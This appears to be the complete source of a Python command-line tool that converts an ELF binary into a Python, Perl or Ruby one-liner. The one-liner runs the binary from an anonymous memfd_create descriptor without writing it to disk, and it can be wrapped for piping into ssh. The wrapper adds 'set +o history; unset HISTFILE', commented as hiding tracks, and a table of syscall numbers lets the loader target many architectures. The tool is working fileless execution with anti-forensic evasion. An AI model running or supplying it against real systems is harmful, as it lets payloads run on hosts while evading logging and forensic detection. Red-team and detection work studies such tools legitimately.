#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# written-by: nns 2021
# for license, check LICENSE file

# pylint: disable=line-too-long
# pylint: disable=missing-class-docstring
# pylint: disable=missing-function-docstring
# pylint: disable=missing-module-docstring

import argparse
import os.path
import struct
import sys
import zlib
from base64 import b64encode


def print_out(what: str) -> None:
    sys.stdout.write(what)
    sys.stdout.flush()


def print_err(what: str) -> None:
    sys.stderr.write(what)
    sys.stderr.flush()


def _get_e_machine(header: bytes) -> int:
    if header[0x05] == 1:
        endianness = "<"
    else:
        endianness = ">"

    _, machine = struct.unpack(f"{endianness}16xHH", header)

    return machine


class CodeGenerator:
    def __init__(self) -> None:
        self.compression_level = 9
        self.wrap = 0
        self.syscall = None
        self._meta = self._Python
        self._generator = None

    def _prepare_elf(self, elf: bytes) -> bytes:
        # compress the binary and encode it with base64
        # base64 is required so we don't put any funky characters in an
        # otherwise human-readable script
        compressed_elf = zlib.compress(elf, self.compression_level)
        encoded = b64encode(compressed_elf)

        return encoded

    def set_lang(self, lang: str) -> None:
        lang = lang.lower()
        if lang in ["py", "python"]:
            self._meta = self._Python
        elif lang in ["pl", "perl"]:
            self._meta = self._Perl
        elif lang in ["rb", "ruby"]:
            self._meta = self._Ruby
        else:
            raise LanguageNotImplementedException(
                f"Language '{lang}' is not implemented"
            )

    def generate(self, elf: bytes, argv: str) -> str:
        self._generator = self._meta(self)
        self._generator.add_header()
        self._generator.add_elf(elf)
        self._generator.add_dump_elf()
        self._generator.add_call_elf(argv)
        return self._generator.output

    def with_command(self, **kwargs) -> str:
        if not self._generator:
            raise GeneratorException("Code not yet generated")

        if kwargs.get("path") is None:
            # this is stupid
            kwargs.pop("path", None)

        # let's try to hide our tracks a bit better
        return (
            f" set +o history; unset HISTFILE; {self._generator.with_command(**kwargs)}"
        )

    class _Perl:
        # Perl generator metaclass
        def __init__(self, outer) -> None:
            self.output = ""
            self.prep_elf = outer._prepare_elf
            self.wrap = outer.wrap
            if not outer.syscall:
                raise GeneratorException(
                    "Perl generator cannot resolve the syscall using libc, specify a target architecture"
                )
            self.syscall = outer.syscall

        def with_command(self, path="/usr/bin/env perl") -> str:
            escaped = self.output.replace('"', '\\"')
            escaped = escaped.replace("$", "\\$")
            return f'{path} -e "{escaped}"'

        def add(self, line: str) -> None:
            self.output += f"{line};\n"

        def add_header(self) -> None:
            self.add("use MIME::Base64")
            self.add("use Compress::Zlib")

        def add_elf(self, elf: bytes) -> None:
            # prepare elf
            encoded = self.prep_elf(elf).decode("ascii")

            # wrap if necessary
            if self.wrap > 3:
                chars = self.wrap - 3  # two quotes and concat operator
                length = len(encoded)
                encoded = "'.\n'".join(
                    encoded[i : i + chars] for i in range(0, length, chars)
                )

            self.add(f"$c = decode_base64(''.\n'{encoded}')")
            self.add("$e = uncompress($c)")

        def add_dump_elf(self) -> None:
            # we create the fd with no name
            self.add("$n = ''")
            self.add(f"$f = syscall({self.syscall}, $n, 1)")
            self.add("open($h, '>&='.$f) or die")
            self.add("select((select($h), $|=1)[0])")
            self.add("print $h $e")

        def add_call_elf(self, argv: str) -> None:
            self.add('$p = "/proc/self/fd/$f"')
            args = argv.strip()
            args = args.replace("'", "\\'")  # escape single quotes, we use them
            args = args.replace(" ", "', '")  # split argv into separate words
            self.add(f"exec {{$p}} '{args}'")

    class _Python:
        # Python generator metaclass
        def __init__(self, outer) -> None:
            self.output = ""
            self.prep_elf = outer._prepare_elf
            self.wrap = outer.wrap
            self.syscall = outer.syscall

        def with_command(self, path="/usr/bin/env python") -> str:
            escaped = self.output.replace('"', '\\"')
            return f'{path} -Bc "{escaped}"'

        def add(self, line: str) -> None:
            self.output += f"{line}\n"

        def add_header(self) -> None:
            self.add("import ctypes, os, base64, zlib")
            self.add("l = ctypes.CDLL(None)")
            if self.syscall:
                self.add("s = l.syscall")  # we specify the syscall manually
            else:
                self.add("s = l.memfd_create")  # dynamic

        def add_elf(self, elf: bytes) -> None:
            # prepare elf
            encoded = f"{self.prep_elf(elf)}"

            # wrap if necessary
            if self.wrap > 3:
                chars = self.wrap - 3  # two quotes and byte literal identifier
                length = len(encoded)
                encoded = "'\nb'".join(
                    encoded[i : i + chars] for i in range(0, length, chars)
                )

            self.add(f"c = base64.b64decode(\n{encoded}\n)")
            self.add("e = zlib.decompress(c)")

        def add_dump_elf(self) -> None:
            # we create the fd with no name
            if self.syscall:
                self.add(f"f = s({self.syscall}, '', 1)")
            else:
                self.add("f = s('', 1)")
            self.add("os.write(f, e)")

        def add_call_elf(self, argv: str) -> None:
            self.add("p = '/proc/self/fd/%d' % f")
            args = argv.strip()
            args = args.replace("'", "\\'")  # escape single quotes, we use them
            args = args.replace(" ", "', '")  # split argv into separate words
            self.add(f"os.execle(p, '{args}', {{}})")

    class _Ruby:
        # Ruby generator metaclass
        def __init__(self, outer) -> None:
            self.output = ""
            self.prep_elf = outer._prepare_elf
            self.wrap = outer.wrap
            if not outer.syscall:
                raise GeneratorException(
                    "Ruby generator cannot resolve the syscall using libc, specify a target architecture"
                )
            self.syscall = outer.syscall

        def with_command(self, path="/usr/bin/env ruby") -> str:
            escaped = self.output.replace('"', '\\"')
            escaped = escaped.replace("$", "\\$")
            return f'{path} -e "{escaped}"'

        def add(self, line: str) -> None:
            self.output += f"{line}\n"

        def add_header(self) -> None:
            self.add("require 'base64'")
            self.add("require 'zlib'")

        def add_elf(self, elf: bytes) -> None:
            # prepare elf
            encoded = self.prep_elf(elf).decode("ascii")

            # wrap if necessary
            if self.wrap > 3:
                chars = self.wrap - 3  # two quotes and concat operator
                length = len(encoded)
                encoded = "'+\n'".join(
                    encoded[i : i + chars] for i in range(0, length, chars)
                )

            self.add(f"c = Base64.decode64(''+\n'{encoded}')")
            self.add("e = Zlib::Inflate.inflate(c)")

        def add_dump_elf(self) -> None:
            # we create the fd with no name
            self.add("n = ''")
            self.add(f"f = syscall({self.syscall}, n, 1)")
            self.add("io = IO.new(f)")
            self.add("io << e")

        def add_call_elf(self, argv: str) -> None:
            self.add('p = "/proc/self/fd/#{f}"')
            args = argv.strip()
            argv0 = args.split()[0]
            args = (
                args[len(argv0) : len(args)].strip().replace("'", "\\'")
            )  # escape single quotes, we use them
            args = args.replace(" ", "', '")  # split argv into separate words
            execline = f"exec([p, '{argv0}']"
            if len(args) > 0:
                execline = execline + f", '{args}'"
            execline = execline + ")"
            self.add(execline)


def main() -> int:
    # we need to monkeypatch the help function to print to stderr
    # as we want nothing but executable code being printed to stdout
    def patched_help_call(
        self, parser, namespace, values, option_string=None
    ):  # pylint: disable=unused-argument
        parser.print_help(file=sys.stderr)
        parser.exit()

    argparse._HelpAction.__call__ = patched_help_call  # pylint: disable=W0212

    # map of memfd_create syscall numbers for different architectures
    # also includes e_machine numbers
    syscall_numbers = {
        **dict.fromkeys(["autodetect", "libc"], -1),
        **dict.fromkeys(["386", 3], 356),
        **dict.fromkeys(["amd64", 62], 319),
        **dict.fromkeys(["arm", 40], 385),
        **dict.fromkeys(["arm64", "riscv64", 183], 279),
        **dict.fromkeys(["mips", 8], 4354),
        **dict.fromkeys(["mips64", "mips64le", 8], 5314),
        **dict.fromkeys(["ppc", "ppc64", 20], 360),
        **dict.fromkeys(["s390x", 22], 350),
        **dict.fromkeys(["sparc64", 2, 18, 43], 348),
    }

    parser = argparse.ArgumentParser(
        description="Print code to stdout to execute an ELF without dropping files."
    )
    parser.add_argument(
        "path", type=argparse.FileType("rb"), help="path to the ELF file"
    )
    arch_or_syscall_group = parser.add_mutually_exclusive_group()
    arch_or_syscall_group.add_argument(
        "-t",
        "--target-architecture",
        metavar="ARCH",
        help="target platform for resolving memfd_create (default: detect from ELF)",
        choices=[k for k in syscall_numbers if isinstance(k, str)],
        default="autodetect",
    )
    arch_or_syscall_group.add_argument(
        "-s",
        "--syscall",
        metavar="NUM",
        type=int,
        help="syscall number for memfd_create for the target platform",
    )
    parser.add_argument(
        "-a",
        "--argv",
        help="space-separated arguments (including argv[0]) supplied to execle (default: path to file as argv[0])",
    )
    parser.add_argument(
        "-l",
        "--language",
        metavar="LANG",
        help="language for the generated code (default: python)",
    )
    parser.add_argument(
        "-c",
        "--with-command",
        action="store_true",
        help="wrap the generated code in a call to an interpreter, for piping directly into ssh",
    )
    parser.add_argument(
        "-p",
        "--interpreter-path",
        metavar="PATH",
        help="path to interpreter on target if '-c' is used, otherwise a sane default is used",
    )
    parser.add_argument(
        "-w",
        "--wrap",
        metavar="CHARS",
        type=int,
        help="when base64-encoding the elf, how many characters to wrap to a newline (default: 0)",
        default=0,
    )
    parser.add_argument(
        "-z",
        "--compression-level",
        metavar="LEVEL",
        type=int,
        help="zlib compression level, 0-9 (default: 9)",
        choices=range(0, 10),
        default=9,
    )
    args = parser.parse_args()

    argv = args.argv
    if not argv:
        # argv not specified, so let's just call it with the basename on the host
        argv = os.path.basename(args.path.name)

    if args.interpreter_path and not args.with_command:
        print_err("note: '-p' flag meaningless without '-c'\n")

    # read the elf
    elf = args.path.read()
    args.path.close()

    code_generator = CodeGenerator()

    code_generator.compression_level = args.compression_level  # defaults to 9
    code_generator.wrap = args.wrap  # defaults to 0, no wrap

    if args.target_architecture == "autodetect":
        args.target_architecture = _get_e_machine(elf[:20])

    if args.target_architecture != "libc":
        # map to syscall number
        syscall = syscall_numbers.get(args.target_architecture)
    else:
        syscall = args.syscall  # None if not specified

    code_generator.syscall = syscall

    try:
        if args.language:
            code_generator.set_lang(args.language)

        out = code_generator.generate(elf, argv)
        if args.with_command:
            out = code_generator.with_command(path=args.interpreter_path)

        # explicitly write to stdout
        print_out(out)
    except Exception as exception:  # pylint: disable=broad-except
        print_err(f"{exception.__str__()}\n")
        print_err("Use --help for more information.\n")
        return 1

    return 0


class LanguageNotImplementedException(Exception):
    pass


class GeneratorException(Exception):
    pass


if __name__ == "__main__":
    sys.exit(main())
